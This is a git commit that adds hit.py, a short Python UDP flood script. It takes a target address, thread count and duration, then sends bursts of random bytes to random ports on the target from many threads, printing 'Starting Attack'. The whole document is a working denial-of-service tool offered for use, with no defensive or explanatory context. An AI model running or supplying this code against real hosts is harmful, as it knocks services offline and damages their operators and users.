aff2139e19c6323aa7ada032742d7bfc745d7885
Natewalker123 <37601262+Natewalker123@users.noreply.github.com>
2021-05-21 12:23:43 -0400

    hit upload

---
+++ hit.py
@@ -0,0 +1,29 @@
+import socket, random, threading, sys, time
+
+try: 
+    target = str(sys.argv[1])
+    threads = int(sys.argv[2])
+    timer = float(sys.argv[3])
+except IndexError:
+    print('\n[+] Command usage: Python' + sys.argv[0] + ' <target> <thread> <time> !')
+    sys.exit()
+
+timeout = time.time() + 1 * timer 
+
+def attack():
+    try:
+        bytes = random._urandom(1024)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while time.time() < timeout:
+            dport = random.randint(20,55500)
+            sock.sendto(bytes*random.randint(5,15),(target, dport))
+        return
+        sys.exit
+    except:
+        pass
+
+print('\n[+] Starting Attack...')
+for x in range(0, threads):
+    threading.Thread(target=attack).start()
+
+print('\n[+] Attack Done.')
